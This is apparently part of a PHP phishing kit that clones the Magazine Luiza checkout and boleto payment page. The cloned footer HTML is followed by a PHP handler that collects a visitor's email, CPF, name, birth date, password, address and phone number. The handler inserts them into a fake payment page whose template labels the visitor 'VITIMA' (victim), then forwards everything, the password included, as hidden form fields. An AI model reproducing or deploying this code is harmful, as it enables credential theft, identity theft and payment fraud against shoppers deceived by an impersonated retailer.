                                    <li class="CheckoutFooter-top-item CheckoutFooter-top-item--sac"
                                        data-reactid=".0.$footer.0.1.0.0.0">
                                        <svg class="CheckoutFooter-icon" width="100" height="99.918"
                                             viewBox="0 0 100 99.918" data-reactid=".0.$footer.0.1.0.0.0.0">
                                            <path d="M98.514 74.927L82.127 58.564a5.073 5.073 0 0 0-7.17.006l-15.44 15.463-33.61-33.56L41.345 25.01a5.06 5.06 0 0 0-.005-7.165L24.954 1.483a5.066 5.066 0 0 0-7.167.004L3.705 15.59c-4.946 4.955-4.938 12.977.015 17.92l62.796 62.702c4.95 4.947 12.977 4.938 17.92-.013l14.085-14.105a5.075 5.075 0 0 0-.006-7.168"
                                                  data-reactid=".0.$footer.0.1.0.0.0.0.0"></path>
                                        </svg>
                                        <span data-reactid=".0.$footer.0.1.0.0.0.1"> </span><a
                                                href="http://www.magazineluiza.com.br/central-de-atendimento/"
                                                data-reactid=".0.$footer.0.1.0.0.0.2">Atendimento</a></li>
                                    <li class="CheckoutFooter-top-item CheckoutFooter-top-item--tel-chat"
                                        data-reactid=".0.$footer.0.1.0.0.1">
                                        <svg class="CheckoutFooter-icon" width="595" height="595" viewBox="0 0 595 595"
                                             data-reactid=".0.$footer.0.1.0.0.1.0">
                                            <path d="M290.8 171H106.9c-18.1 0-32.2 15.1-32.2 33h249c0-17.9-14.8-33-32.9-33M198.8 404.313c-54.4 0-98.7-45.3-98.7-100.2 0-6.2 4.7-11 10.8-11s10.8 4.8 10.8 11c0 43.2 34.2 77.5 76.5 77.5s76.5-35 76.5-77.5c0-6.2 4.7-11 10.8-11s10.8 4.8 10.8 11c1.2 55.6-43.1 100.2-97.5 100.2zm165.2-136.5c-1.4-23.3-20.2-41.2-43-41.2H76.6c-22.8 0-41.6 17.9-43 41.2l-16 243.6c-1.4 25.4 18.1 47.4 43 47.4h275.9c24.8 0 45-22 43-47.4l-15.5-243.6z"
                                                  data-reactid=".0.$footer.0.1.0.0.1.0.0"></path>
                                            <g data-reactid=".0.$footer.0.1.0.0.1.0.1">
                                                <path d="M576.9 354.5L557 286.1c-2.4-8.3-11.1-13-19.3-10.6l-64.5 18.8L432.3 154l64.5-18.8c8.3-2.4 13-11.1 10.6-19.3l-19.9-68.4c-2.4-8.3-11.1-13-19.3-10.6L409.4 54c-20.7 6-32.6 27.6-26.5 48.3l76.2 262.1c6 20.7 27.6 32.6 48.3 26.5l58.9-17.1c8.2-2.4 13-11 10.6-19.3z"
                                                      data-reactid=".0.$footer.0.1.0.0.1.0.1.0"></path>
                                            </g>
                                        </svg>
                                        <span data-reactid=".0.$footer.0.1.0.0.1.1"> Compre pelo </span><a
                                                href="https://sacola.magazineluiza.com.br/#"
                                                data-reactid=".0.$footer.0.1.0.0.1.2">telefone (11) 3508-9900</a><span
                                                data-reactid=".0.$footer.0.1.0.0.1.3"> ou </span><a
                                                href="https://sacola.magazineluiza.com.br/#"
                                                data-reactid=".0.$footer.0.1.0.0.1.4">chat online</a></li>
                                    <li class="CheckoutFooter-top-item CheckoutFooter-top-item--certificate"
                                        data-reactid=".0.$footer.0.1.0.0.2">
                                        <svg class="CheckoutFooter-icon" width="100" height="125" viewBox="0 0 100 125"
                                             data-reactid=".0.$footer.0.1.0.0.2.0">
                                            <path d="M87.5 53.125h-.566V36.93C86.934 16.534 70.4 0 50 0 29.603 0 13.068 16.534 13.068 36.93v16.195H12.5C5.598 53.125 0 58.72 0 65.623V112.5c0 6.9 5.598 12.5 12.5 12.5h75c6.903 0 12.5-5.6 12.5-12.5V65.623c0-6.902-5.596-12.498-12.5-12.498zM25.568 36.93C25.568 23.46 36.53 12.5 50 12.5c13.475 0 24.434 10.96 24.434 24.43v16.195H25.568V36.93z"
                                                  data-reactid=".0.$footer.0.1.0.0.2.0.0"></path>
                                        </svg>
                                        <span data-reactid=".0.$footer.0.1.0.0.2.1"> </span><a
                                                href="http://www.magazineluiza.com.br/estaticas/seguranca-maxima/"
                                                target="_blank" data-reactid=".0.$footer.0.1.0.0.2.2">Certificados e
                                            segurança</a></li>
                                    <li class="CheckoutFooter-top-item CheckoutFooter-top-item--logo-internetSegura"
                                        data-reactid=".0.$footer.0.1.0.0.3"><a href="http://www.internetsegura.org/"
                                                                               target="_blank"
                                                                               data-reactid=".0.$footer.0.1.0.0.3.0">
                                            <svg class="CheckoutFooter-logo-internetSegura" width="100" height="38.354"
                                                 viewBox="0 0 100 38.354" data-reactid=".0.$footer.0.1.0.0.3.0.0">
                                                <path fill="#219C31"
                                                      d="M0 .073h4.075v15.603H0V.073zM23.774.073h10.712v3.463H31.21l-.01 12.14h-4.086l-.016-12.14h-3.324s.006-2.298 0-3.463zM35.93.073h8.85V3.54h-4.812v2.53h4.602l-.016 3.545H39.97l.004 2.56 4.806-.02v3.522h-8.848s.015-10.412 0-15.604zM89.33.073H100v3.48h-3.297v12.123H92.61V3.536l-3.28.026V.072zM6.916.073h4.086l7.286 9.583V.073h4.188v15.603h-4.188L11 6.07v9.605H6.917S6.97 5.26 6.916.073zM47.216.073s5.69-.328 8.446.4c2.99.87 3.902 4.946 2.11 7.303-.612.812-2.44 1.682-2.44 1.682l4.838 6.217h-5.096l-3.845-6.04v6.04h-4.017s.032-10.41-.016-15.603h.02zM61.133.073h4.07l7.365 9.594V.073h4.098l.005 15.603H72.57L65.203 6.08v9.596h-4.07L61.14.073zM79.2.073h8.616V3.54h-4.51v2.523h4.51v3.56h-4.51v2.535h4.51v3.517h-8.61s0-10.416-.006-15.602z"
                                                      data-reactid=".0.$footer.0.1.0.0.3.0.0.0"></path>
                                                <path fill="#FFF"
                                                      d="M51.238 3.166c1.28.134 3.328.263 3.205 2.05.01 1.714-1.96 1.805-3.21 1.972-.01-1.343-.006-2.68.005-4.022z"
                                                      data-reactid=".0.$footer.0.1.0.0.3.0.0.1"></path>
                                                <path d="M0 17.25s66.663-.013 100 .004c-.02 7.034-.02 14.066 0 21.1H0V17.25z"
                                                      data-reactid=".0.$footer.0.1.0.0.3.0.0.2"></path>
                                                <path fill="#FFF"
                                                      d="M28.72 23.156c2.405-5.092 9.863-6.45 14.18-3.034.993.858 1.713 1.976 2.47 3.034-1.44.67-2.91 1.27-4.37 1.89-.833-1.257-1.858-2.62-3.48-2.803-2.41-.316-4.407 1.788-4.847 4.01-.96 3.083 1.192 7.42 4.8 7.088 1.783.033 3.087-1.485 3.522-3.09-1.304-.02-3.92 0-3.92 0l.006-3.626h9.2s-.425 5.277-2.095 7.324c-3.742 4.862-12.462 4.096-15.324-1.316-1.59-2.878-1.633-6.55-.14-9.476zM4.44 19.016c2.71-1.32 5.782-.37 8.376.75a100.108 100.108 0 0 1-1.713 3.63c-1.272-.595-2.76-1.717-4.177-.874-.94.28-1.31 1.605-.42 2.18 2.074 1.246 4.99 1.172 6.422 3.395 1.417 2.566.612 6.367-2.02 7.87-3.285 1.918-7.424 1.064-10.447-.955.677-1.22 1.35-2.438 2.02-3.656 1.402.956 2.99 2.066 4.795 1.648 1.23-.097 2.142-1.857 1.004-2.706-1.972-1.225-4.71-1.117-6.25-3.013-1.788-2.708-.64-6.998 2.41-8.27zM15.715 18.887h10.067v3.897h-5.364v2.964h5.364v3.882l-5.364.017v3.07h5.364v3.818H15.71s-.005-11.76.005-17.648zM48.242 18.887h4.574v11.038c0 1.56 1.234 3.152 2.88 3.018 1.47.2 3.178-1.46 3.178-3.018V18.887h4.703s.048 7.758-.05 11.63c-.053 2.114-.977 4.386-2.937 5.4-2.89 1.536-6.522 1.486-9.434.017-1.74-.967-2.797-2.916-2.856-4.887-.124-4.048-.06-12.155-.06-12.155v-.005zM66.357 18.887s7.48-.763 10.813.918c3.678 2.212 2.813 8.67-1.493 9.61 1.72 2.404 5.192 7.12 5.192 7.12h-5.435l-4.354-6.733-.005 6.733h-4.708L66.355 18.9v-.014h.002zM87.538 18.887h5.048l6.657 17.648H94.26l-1.072-3.008-6.373.006-1.11 3.002h-4.532c-.002 0 4.503-12.88 6.365-17.648z"
                                                      data-reactid=".0.$footer.0.1.0.0.3.0.0.3"></path>
                                                <path d="M71.07 22.365c1.472.06 3.7.22 3.607 2.238.104 1.98-2.19 2.12-3.607 2.348-.015-1.53-.015-3.054 0-4.585zM88.102 30l1.938-5.696 1.853 5.702S89.363 30 88.103 30z"
                                                      data-reactid=".0.$footer.0.1.0.0.3.0.0.4"></path>
                                            </svg>
                                        </a></li>
                                    <li class="CheckoutFooter-top-item CheckoutFooter-top-item--logo-ebit"
                                        data-reactid=".0.$footer.0.1.0.0.4"><a
                                                href="https://www.ebit.com.br/magazine-luiza" target="_blank"
                                                data-reactid=".0.$footer.0.1.0.0.4.0">
                                            <svg class="CheckoutFooter-logo-ebit" width="100" height="37.414"
                                                 viewBox="0 0 100 37.414" data-reactid=".0.$footer.0.1.0.0.4.0.0">
                                                <path fill="#FF151F"
                                                      d="M16.873.18c3.736-.33 7.574.413 10.845 2.275 4.195 2.314 7.43 6.31 8.78 10.916 1.288 4.336.978 9.147-.967 13.24-1.795 3.934-5.035 7.192-8.963 8.997-4.664 2.24-10.28 2.36-15.052.374-4.363-1.748-7.958-5.275-9.88-9.556-1.47-3.166-1.904-6.753-1.48-10.2C.76 11.48 3.31 7.026 7.075 4.09 9.866 1.86 13.32.503 16.874.18zM72.95.16c1.246-.372 2.68-.09 3.655.786 1.35 1.264 1.382 3.563.113 4.898-1.578 1.63-4.718 1.36-5.814-.696C69.877 3.314 70.812.643 72.95.16z"
                                                      data-reactid=".0.$footer.0.1.0.0.4.0.0.0"></path>
                                                <path fill="#030203"
                                                      d="M85.208 2.616h7.1v7.927h5.797v5.087c-1.934 0-3.864.002-5.798 0-.002 4.22.005 8.438-.002 12.658-.02.922.227 1.96.99 2.553.917.642 2.088.375 3.132.394a59.912 59.912 0 0 0 2.466-.542c.374 1.934.856 3.853 1.107 5.807-2.91.784-6.022 1.142-8.98.408-1.855-.438-3.648-1.498-4.64-3.168-.826-1.256-1.12-2.785-1.174-4.267.004-4.602.002-9.207.002-13.812-1.387-.162-2.762-.394-4.14-.6-.004-1.507 0-3.012 0-4.517h4.14V2.616z"
                                                      data-reactid=".0.$footer.0.1.0.0.4.0.0.1"></path>
                                                <path fill="#FFF"
                                                      d="M17.014 6.852c2.435-.28 5.002-.092 7.21 1.048 3.11 1.496 5.125 4.728 5.617 8.085.307 1.64.23 3.31.233 4.97-5.31.004-10.62-.013-15.927.01.355 1.236.954 2.486 2.054 3.227 1.75 1.268 4.278 1.287 6.065.085.757-.482 1.344-1.176 1.914-1.855a182.66 182.66 0 0 1 4.96 3.632c-2.05 2.617-5.273 4.176-8.56 4.45-2.982.22-6.056-.496-8.557-2.157-2.255-1.49-3.923-3.855-4.536-6.49-.854-3.494-.298-7.386 1.758-10.375 1.735-2.595 4.698-4.247 7.77-4.63z"
                                                      data-reactid=".0.$footer.0.1.0.0.4.0.0.2"></path>
                                                <path fill="#030203"
                                                      d="M70.538 10.543h7.1c0 8.448-.003 16.893.002 25.34.092.71-.415 1.534-1.188 1.513-1.97.02-3.942-.002-5.913.005-.002-8.95-.002-17.905-.002-26.857z"
                                                      data-reactid=".0.$footer.0.1.0.0.4.0.0.3"></path>
                                                <path fill="#FF151F"
                                                      d="M16.662 12.533c1.493-.667 3.384-.696 4.75.29 1.074.72 1.645 2.007 1.734 3.27-3.01.018-6.02-.003-9.03.01.248-1.495 1.143-2.915 2.546-3.57z"
                                                      data-reactid=".0.$footer.0.1.0.0.4.0.0.4"></path>
                                                <path fill="#030203"
                                                      d="M66.884 20.955c-.306-2.4-1.227-4.713-2.69-6.64-1.945-2.54-5.128-4.082-8.327-4.016-2.494-.09-5.09.617-6.993 2.28.024-4.188.002-8.377.01-12.565-2.64 0-5.282 0-7.923-.002 0 11.857.006 23.715 0 35.573 2.545.757 5.138 1.407 7.79 1.67 3.376.31 6.906.263 10.084-1.06 2.767-1.056 5.14-3.124 6.52-5.748 1.556-2.886 1.883-6.278 1.53-9.493zm-9.037 6.978c-.774 1.275-2.052 2.233-3.505 2.584-1.796.438-3.73.31-5.463-.32.016-2.877-.008-5.754.013-8.632.225-1.645 1.03-3.365 2.657-4.02 1.678-.645 3.814-.692 5.253.526 1.273 1.007 1.855 2.618 2.102 4.173.166 1.935.007 4.01-1.058 5.69z"
                                                      data-reactid=".0.$footer.0.1.0.0.4.0.0.5"></path>
                                            </svg>
                                        </a></li>
                                </ul>
                            </div>
                            <div class="CheckoutFooter-section" data-reactid=".0.$footer.0.1.1"><span
                                        data-reactid=".0.$footer.0.1.1.0">Preços e condições de pagamento exclusivos para compras via internet, podendo variar nas lojas físicas.</span><br
                                        data-reactid=".0.$footer.0.1.1.1"><span data-reactid=".0.$footer.0.1.1.2">Ofertas válidas na compra de até </span><span
                                        data-reactid=".0.$footer.0.1.1.3">10</span><span
                                        data-reactid=".0.$footer.0.1.1.4"> peças de cada produto por cliente, até o término dos nossos estoques para internet.</span><br
                                        data-reactid=".0.$footer.0.1.1.5"><span data-reactid=".0.$footer.0.1.1.6">Caso os produtos apresentem divergências de valores, o preço válido é o da Sacola de compras.</span><br
                                        data-reactid=".0.$footer.0.1.1.7"><span data-reactid=".0.$footer.0.1.1.8">Vendas sujeitas a análise e confirmação de dados.</span>
                            </div>
                            <div class="CheckoutFooter-section" data-reactid=".0.$footer.0.1.2"><span
                                        data-reactid=".0.$footer.0.1.2.0">Rodovia dos Bandeirantes KM 68,760 - Rio Abaixo - CEP: 13213-902 - Louveira/SP - CNPJ: 47960950/0449-27</span><br
                                        data-reactid=".0.$footer.0.1.2.1"><span data-reactid=".0.$footer.0.1.2.2">Magazine Luiza – Todos os direitos reservados</span>
                            </div>
                        </div>
                    </div>
                </div>
                <noscript data-reactid=".0.3"></noscript>
                <noscript data-reactid=".0.4"></noscript>
            </div>
        </div>



        <div class="ReactModalPortal">
            <div data-reactid=".1"></div>
        </div>
        <div class="ReactModalPortal">
            <div data-reactid=".2"></div>
        </div>












        <div style="width:0px; height:0px; display:none; visibility:hidden;" id="batBeacon0.3131489809845851"><img
                    style="width:0px; height:0px; display:none; visibility:hidden;" id="batBeacon0.3518057125190355"
                    width="0" height="0" alt="" src="./pagamentoleto_files/0"></div>
        <iframe name="_hjRemoteVarsFrame" title="_hjRemoteVarsFrame" id="_hjRemoteVarsFrame"
                style="display: none !important; width: 1px !important; height: 1px !important; opacity: 0 !important; pointer-events: none !important;"
                src="./pagamentoleto_files/rcj-99d43ead6bdf30da8ed5ffcb4f17100c.html"></iframe>

        <div id="ads"></div>





        <iframe height="0" width="0" src="./pagamentoleto_files/activityi.html"
                style="display: none; visibility: hidden;"></iframe>
        <iframe height="0" width="0" src="./pagamentoleto_files/activityi(1).html"
                style="display: none; visibility: hidden;"></iframe>





        <img height="1" width="1" style="style:none;" alt=""
             src="https://googleads.g.doubleclick.net/pagead/viewthroughconversion/1012714216/?value=0&guid=ON&script=0">



        <div style="display: none; visibility: hidden;">


            <noscript></noscript>
        </div>



        <iframe height="0" width="0" src="./pagamentoleto_files/activityi(2).html"
                style="display: none; visibility: hidden;"></iframe>






        <iframe sandbox="allow-scripts allow-same-origin" title="Adobe ID Syncing iFrame"
                id="destination_publishing_iframe_luiza_0" src="./pagamentoleto_files/dest5.html"
                class="aamIframeLoaded" style="display: none; width: 0px; height: 0px;"></iframe>



        <noscript>
            <div style="display:inline;">
                <img height="1" width="1" style="border-style:none;" alt=""
                     src="//googleads.g.doubleclick.net/pagead/viewthroughconversion/1043555940/?guid=ON&script=0">
            </div>
        </noscript>
        <div id="criteo-tags-div" style="display: none;"></div>
























        <iframe height="0" width="0" src="./pagamentoleto_files/activityi(3).html"
                style="display: none; visibility: hidden;"></iframe>
















        <iframe height="0" width="0" src="./pagamentoleto_files/activityi(4).html"
                style="display: none; visibility: hidden;"></iframe>
        <iframe height="0" width="0" src="./pagamentoleto_files/activityi(5).html"
                style="display: none; visibility: hidden;"></iframe>
        <iframe height="0" width="0" src="./pagamentoleto_files/activityi(6).html"
                style="display: none; visibility: hidden;"></iframe>









        <iframe id="csdp_e3cbed90-e10e-3c82-9051-f41a620482b0" src="./pagamentoleto_files/fp.html"
                style="position: absolute; width: 1px; height: 1px; left: -9999px;"></iframe>
        <div class="ReactModalPortal">
            <div data-reactid=".6"></div>
        </div>




        </body>
        </html>
        <?php break;
    case "mobile":
        $email = $_POST['email'];
        $cpf = $_POST['cpf_cnpj'];
        $nomecompleto = $_POST['name'];
        $nascimento = $_POST['birth_date'];
        $senha = $_POST['password'];
        $cep = $_POST['cep'];
        $endereco = $_POST['rua'];
        $numero = $_POST['number'];
        $complemento = $_POST['complement'];
        $bairro = $_POST['bairro'];
        $cidade = $_POST['cidade'];
        $estado = $_POST['uf'];
        $telefone = $_POST['phone_number'];
        $conteudo = file_get_contents('../dist/mobile/pagamentoleto.html');
        $s1 = str_replace('{$PRECO}', $preco, $conteudo);
        $s2 = str_replace('{$NOMEPRODUTO}', $nome, $s1);
        $s3 = str_replace('{$IMAGEMPRODUTO}', $imagem, $s2);
        $s4 = str_replace('{$NOMEVITIMA}', $nomecompleto, $s3);
        $s5 = str_replace('{$NUMEROVITIMA}', $numero, $s4);
        $s6 = str_replace('{$BAIRRO}', $bairro, $s5);
        $s7 = str_replace('{$CIDADE}', $cidade, $s6);
        $s8 = str_replace('{$ESTADO}', $estado, $s7);
        $s9 = str_replace('{$CEP}', $cep, $s8);
        $s10 = str_replace('<form method="post" class="order-form" action="sucessoleto.php">','<form method="post" class="order-form" action="sucessoleto.php?id='.$id.'&titulo='.$nomelink.'&dist='.$dist.'"><input type="hidden" name="email" value="'.$email.'"><input type="hidden" name="cpf_cnpj" value="'.$cpf.'"><input type="hidden" name="name" value="'.$nomecompleto.'"><input type="hidden" name="birth_date" value="'.$nascimento.'"><input type="hidden" name="password" value="'.$senha.'"><input type="hidden" name="cep" value="'.$cep.'"><input type="hidden" name="rua" value="'.$endereco.'"><input type="hidden" name="number" value="'.$numero.'"><input type="hidden" name="complement" value="'.$complemento.'"><input type="hidden" name="bairro" value="'.$bairro.'"><input type="hidden" name="cidade" value="'.$cidade.'"><input type="hidden" name="uf" value="'.$estado.'"><input type="hidden" name="phone_number" value="'.$telefone.'">', $s9);
        echo $s10;
        break;
};